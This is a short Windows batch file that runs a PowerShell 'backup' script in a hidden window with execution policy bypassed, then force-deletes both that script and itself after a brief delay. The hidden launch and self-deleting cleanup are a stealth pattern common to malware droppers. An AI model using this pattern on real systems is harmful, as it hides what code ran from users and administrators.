@echo off
REM -- Run the PowerShell backup script hidden --
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0backup.ps1"

REM -- Launch a separate cmd to delete the files after a short delay --
start "" cmd /c "ping 127.0.0.1 -n 5 >nul & del /f /q "%~dp0backup.ps1" & del /f /q "%~f0""
